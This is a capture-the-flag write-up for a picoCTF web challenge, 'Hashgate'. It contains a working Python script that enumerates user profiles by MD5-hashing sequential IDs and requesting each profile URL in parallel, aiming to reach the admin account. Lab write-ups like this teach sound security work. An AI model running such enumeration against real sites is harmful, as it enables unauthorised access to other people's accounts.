# Hashgate

You have gotten access to an organisation's portal. Submit your email and password, and it redirects you to your profile.
But be careful: just because access to the admin isn’t directly exposed doesn’t mean it’s secure.
Maybe someone forgot that obscurity isn’t security...
Can you find your way into the admin’s profile for this organisation and capture the flag?
---
## Script

```
import requests
import hashlib
import concurrent.futures
import threading


site = "http://crystal-peak.picoctf.net:55925" #Change this

hashes = []
target_id = 10000
ids = []
for i in range(target_id):
	ids.append(i)
	
def bruteforce(ids):
	hash = hashlib.md5(str(ids).encode()).hexdigest()
	print("Testing id:",ids) 
	response = requests.get(site+"/profile/user/"+hash)
	print("Response:",response.text)
	print("Status Code:",response.status_code)
	if response.text != "User not found.":
		print("Hash Found:",hash)
		print(response.text)
		hashes.append(hash)
			
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(bruteforce,ids)
 
print(hashes)

```
